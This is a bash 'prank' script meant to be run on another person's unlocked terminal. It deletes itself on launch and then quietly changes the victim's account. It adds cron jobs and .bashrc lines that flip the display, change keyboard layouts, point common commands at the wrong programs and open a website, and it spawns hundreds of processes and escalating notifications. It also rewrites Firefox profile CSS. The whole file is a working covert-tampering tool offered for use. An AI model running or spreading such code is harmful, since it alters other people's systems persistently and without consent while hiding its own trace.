#!/bin/bash
#############################
#        Prank file         #
#   by Sebastian Paaske     #
# ######################### #
# That'll teach ya to lock  #
#      your terminal.       #
# ######################### #
#   http://prank.coq.dk     #
#############################

# Preemptively delete the script from the system
rm "$0"

# Determine output device for our X trickery
DEVICE=`xrandr -q|awk '/ connected/{print $1; exit;}'`

# Seed the RNG
RANDOM=`date '+%s'`

# Semi-permanent prank
for n in {1 .. $[($RANDOM % 3) + 1]}
do
    case $[$RANDOM % 12] in
        0) # Mirror the display weekly
            crontab -l | sed "\$a\@weekly /usr/bin/xrandr --output $DEVICE --reflect xy" | crontab -
            ;;
        1) # Mirror the display every time a bash shell is started
            echo "xrandr --output $DEVICE --reflect xy" >> ~/.bashrc
            ;;
        2) # Remove VIM colors
            echo '" Improve color scheme' >> ~/.vimrc
            echo 'set t_Co=0' >> ~/.vimrc
            ;;
        3) # Screw up aliases
            echo '# Helpful aliases' >> ~/.bashrc
            echo "alias ls=`which ln`" >> ~/.bashrc
            echo "alias ln=`which man`" >> ~/.bashrc
            echo "alias man=`which cat`" >> ~/.bashrc
            echo "alias cat=`which htop`" >> ~/.bashrc
            echo "alias python=`which perl`" >> ~/.bashrc
            # Let the editor wars begin
            echo "alias emacs=`which vim`" >> ~/.bashrc
            echo "alias emacsclient=`which vim`" >> ~/.bashrc
            echo "alias vim=`which emacs`" >> ~/.bashrc
            echo "alias gvim=`which emacs`" >> ~/.bashrc
            echo "alias vi=`which emacs`" >> ~/.bashrc
            echo "alias nano=`which gedit`" >> ~/.bashrc
            echo "alias ed=`which gedit`" >> ~/.bashrc
            echo "alias gedit=`which nano`" >> ~/.bashrc
            ;;
        4) # Set keyboard layout to dvorak
            echo "setxkbmap dvorak" >> ~/.bashrc
            ;;
        5) # Set keyboard layout to colemak
            echo "setxkbmap us colemak" >> ~/.bashrc
            ;;
        6) # Set default editor to gedit
            echo "export EDITOR=gedit" >> ~/.bashrc
            ;;
        7) # Eject CD-drive on certain commands
            echo "alias ls=\"sh -c 'eject &' && `which ls`\"" >> ~/.bashrc
            echo "alias cd=\"sh -c 'eject &' && `which cd`\"" >> ~/.bashrc
            ;;
        8) # Open beepdog daily
            crontab -l | sed "\$a\@daily nohup www-browser http://beepdog.us >> /dev/null &" | crontab -
            ;;
        9) # Emulate DOS-prompt
            echo "export PS1='C:\${PWD//\//\\\\\\\\\\}> '" >> ~/.bashrc
            ;;
        10) # Create ~-folder
            mkdir -p -m 0400 ~/\~/{1..100}
            ;;
        11) # Give user a notification more and more often
            if [ `command -v notify-send` ] ; then
                echo ":(){ (sleep \$1 ; notify-send "Ulåst datamat er ulåst" ; : \$((\$1/2))) };: 600 &" >> ~/.bashrc
            fi
    esac
done

# Active distraction prank
for n in {1 .. $[($RANDOM % 3) + 1]}
do
    case $[$RANDOM % 9] in
        0) # Mirror the display
            xrandr --output $DEVICE --reflect xy
            ;;
        1) # Set keyboard layout to dvorak
            setxkbmap dvorak
            ;;
        2) # Set keyboard layout to colemak
            setxkbmap us colemak
            ;;
        3) # Open lots of eyes
            for i in {1 .. 250}
            do
                nohup xeyes >> /dev/null &
            done
            ;;
        4) # Flip display
            xrandr --output $DEVICE --reflect x
            ;;
        5) # Flip display
            xrandr --output $DEVICE --reflect y
            ;;
        6) # Beepdog!
            nohup www-browser http://beepdog.us >> /dev/null &
            ;;
        7) # Play the first notes of "Trololo" on the users PC speaker
            beep -f 261.6 -l 30 -D 70 -n -f 329.6 -l 30 -D 70 -n -f 392.0 -l 30 -D 70 -n -f 493.9 -l 30 -D 70 -n -f
440.0 -l 30 -D 170 -n -f 440.0 -l 30 -D 70 -n -f 349.2 -l 30 -D 70 -n -f 392.0 -l 30 -D 170 -n -f 392.0 -l 30 -D 70 -n
-f 277.2 -l 30 -D 70 -n -f 329.0 -l 30
            ;;
        8) # Make Firefox pretty, 0 bugs 2> /dev/null
            OS=`uname -a|awk '{print $1}'`
            case $OS in
                "Darwin" )
                    ln -s ~/Library/Application\ Support/Firefox hodepine 2> /dev/null
                    MOZ_DIR=`find -L hodepine -maxdepth 2 -mindepth 2 -type d -regex '.*/[a-z0-9].*.'`;;
                "Linux" ) MOZ_DIR=`find -L ~/.mozilla -maxdepth 2 -mindepth 2 -regextype posix-extended -regex '.*[a-z0-9]{8}\..*$' -type d`;;
                * ) break 2;;
            esac

            mkdir "$MOZ_DIR/chrome" 2> /dev/null

            for i in $MOZ_DIR; do
                USRCHROME="$i/chrome/userChrome.css"
                USRCONTNT="$i/chrome/userContent.css"
                mv "$USRCHROME" "$USRCHROME.`date +%s`" 2> /dev/null
                mv "$USRCONTNT" "$USRCONTNT.`date +%s`" 2> /dev/null
                echo "#main-window{-moz-transform:rotate(180deg);}" >> "$USRCHROME"
                echo "body{background:url(http://i.imgur.com/YcWr0.gif) #FF1493 !important;text-decoration:blink !important;color: #0F0 !important;}" >> "$USRCONTNT"
                echo 'body:after{content:"DNUR!";font-size:1000%;-moz-transform:rotate(180deg);}' >> "$USRCONTNT"
                echo "#lga div div{display:none;}" >> "$USRCONTNT"
                echo "#lga div{background:url(http://i.imgur.com/Ki4qs.png) no-repeat;margin-left:45%;margin-top:120px;}" >> "$USRCONTNT"
            done

            if [[ $OS == "Darwin" ]]; then
                rm hodepine 2> /dev/null
            fi
            ;;
    esac
done

clear
echo "Hello there. Nice to meet you."
echo "You might want to remember to lock your screen next time."
